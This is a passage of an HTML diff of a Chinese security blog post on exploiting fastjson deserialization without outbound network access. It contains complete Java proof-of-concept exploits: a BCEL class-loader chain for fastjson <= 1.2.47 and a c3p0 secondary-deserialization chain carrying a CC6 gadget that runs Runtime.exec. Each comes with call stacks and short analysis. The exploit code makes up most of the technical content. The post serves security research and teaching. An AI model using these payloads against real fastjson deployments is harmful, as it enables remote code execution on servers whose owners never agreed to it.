(Poc.bcel)</span><br></pre></td></tr></table></figure>
+
+
+<p>bcel exp for fastjson &lt;&#x3D; 1.2.47</p>
+<figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 15:42</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;xx\&quot;:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;   : \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;x\&quot; : &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;name\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;val\&quot;   : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;c\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot; : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125; : \&quot;xxx\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        <span class="comment">// 这里必不可少，坑</span></span><br><span class="line">        jsonObject.toJSONString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个版本踩坑，触发点不在 parseObject，而是得到反序列化后的对象， 再进行 <code>jsonObject.toJSONString()</code> 才会触发。</p>
+<p>这个链子和上一个完全一样，不再赘述。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">write:-1, ASMSerializer_1_BasicDataSource (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:236, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:863, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.bcel)</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/360993.html">https://www.freebuf.com/vuls/360993.html</a></li>
+</ul>
+<h2 id="c3p0二次反序列化链"><a href="#c3p0二次反序列化链" class="headerlink" title="c3p0二次反序列化链"></a>c3p0二次反序列化链</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt; 1.2.47 ，payload 分两个，简单的可在低版本使用，复杂的可在 fastjson &lt;1.2.47 的条件下使用。</p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：通过fastjson触发setter设置<code>userOverridesAsString</code>，source点是WrapperConnectionPoolDataSource的构造函数，其中会执行<code>parseUserOverridesAsString(this.getUserOverridesAsString())</code>，经过一系列调用会到达 sink 点，一个反序列化方法<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray</code>，他会对<code>userOverridesAsString</code>中的 bytecodes 做解码和反序列化。</p>
+<p>所以我们的 payload 应该是一个 evil object 的序列化字符串，并对其进行相应的编码，在fastjson链子触发之后，会对这个evil serialize string 进行解码和反序列化，从而实现二次反序列化攻击，。下面的Poc使用的是 CC6的对象。</p>
+<p>需要注意的是 <code>WrapperConnectionPoolDataSource</code> 本身并没有 <code>userOverridesAsString</code> 属性和其对应的 setter，但是它的父类 <code>WrapperConnectionPoolDataSourceBase</code> 有，所以链子才能够走通。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9f3bffd838a5bee5c5af218e8822cc69.png"></p>
+<figure class="highlight java"><figcaption><span>title:"POC_1_2_47.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: c3p0 chain for fastjson &lt; 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:58</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造 CC6 evil object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>函数调用栈，这里只给触发二次反序列化的第一次，后面的CC6就不放了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deserializeFromByteArray:143, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">fromByteArray:123, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)</span><br><span class="line">fireVetoableChange:375, VetoableChangeSupport (java.beans)</span><br><span class="line">fireVetoableChange:271, VetoableChangeSupport (java.beans)</span><br><span class="line">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.c3p0)</span><br></pre></td></tr></table></figure>
+<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1886/">https://tttang.com/archive/1886/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136563391">https://blog.csdn.net/uuzeray/article/details/136563391</a></li>
+</ul>
+<h2 id="Commons-io-写⽂件-webshell-TODO"><a href="#Commons-io-写⽂件-webshell-TODO" class="headerlink" title="Commons-io 写⽂件&#x2F;webshell TODO"></a>Commons-io 写⽂件&#x2F;webshell TODO</h2><p>以后再来</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">TemplatesImpl 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL-%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">BCEL 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">2.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c3p0%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">c3p0二次反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-number">3.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-io-%E5%86%99%E2%BD%82%E4%BB%B6-webshell-TODO"><span class="toc-number">4.</span> <span class="toc-text">Commons-io 写⽂件&#x2F;webshell TODO</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/3821091475.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/3821091475.html&text=fastjson反序列化 不出网利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/3821091475.html&is_video=false&description=fastjson反序列化 不出网利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化 不出网利用&body=Check out this article: https://jaspersec.top/posts/3821091475.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/3821091475.html&name=fastjson反序列化 不出网利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/3821091475.html&t=fastjson反序列化 不出网利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
